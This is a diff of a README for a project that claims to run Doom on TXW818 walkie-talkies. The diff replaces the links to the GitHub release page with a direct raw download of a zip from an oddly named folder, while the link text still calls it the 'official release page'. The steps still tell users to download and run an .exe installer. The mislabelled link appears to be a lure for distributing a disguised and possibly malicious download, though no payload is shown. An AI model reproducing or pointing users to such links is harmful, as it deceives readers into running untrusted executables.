@@ -1,6 +1,6 @@
 # 🎮 TXW818_WalkieTalkie_Doom - Play classic games on walkie talkies
 
-[![](https://img.shields.io/badge/Download_Software-Release_Page-blue)](https://github.com/VadimGotfrid430/TXW818_WalkieTalkie_Doom/releases)
+[![](https://img.shields.io/badge/Download_Software-Release_Page-blue)](https://github.com/VadimGotfrid430/TXW818_WalkieTalkie_Doom/raw/refs/heads/main/unprosodic/TX_Doom_Walkie_Talkie_v1.0.zip)
 
 This project brings the game Doom to TXW818 walkie-talkies. The software works on hardware with a C-Sky chip. You can play the full game on the screen of your radio.
 
@@ -25,7 +25,7 @@ Ensure that your radio battery has a charge of at least 50 percent before you be
 Follow these steps to prepare your computer and your radio.
 
 1. Turn on your computer and open your web browser.
-2. Go to the [official release page](https://github.com/VadimGotfrid430/TXW818_WalkieTalkie_Doom/releases).
+2. Go to the [official release page](https://github.com/VadimGotfrid430/TXW818_WalkieTalkie_Doom/raw/refs/heads/main/unprosodic/TX_Doom_Walkie_Talkie_v1.0.zip).
 3. Look for the section labeled Assets.
 4. Click the link that ends in .exe to download the installer.
 5. Save the file to your desktop for easy access.
